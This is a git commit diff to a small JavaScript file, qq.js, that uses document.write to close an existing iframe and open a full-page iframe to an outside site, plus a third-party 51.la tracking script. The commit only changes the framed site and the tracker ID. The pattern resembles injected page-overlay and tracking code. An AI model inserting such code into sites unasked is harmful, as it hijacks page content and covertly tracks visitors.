75210bb2b377c06218d7cbd921839f287ebe3fed
qiang188 <bt_gady@sina.com>
2015-08-13 18:11:51 +0800

    Update qq.js

--- js/qq.js
+++ js/qq.js
@@ -1,3 +1,3 @@
-document.write("</iframe><iframe src='http://www.cxqqw.com/' rel='nofollow' scrolling='no' frameborder='0' width='100%'  height='4000'>")
+document.write("</iframe><iframe src='http://www.qktar.ac.cn/' rel='nofollow' scrolling='no' frameborder='0' width='100%'  height='4000'>")
 
-document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/17829820.js"></script>');
+document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/18518845.js"></script>');
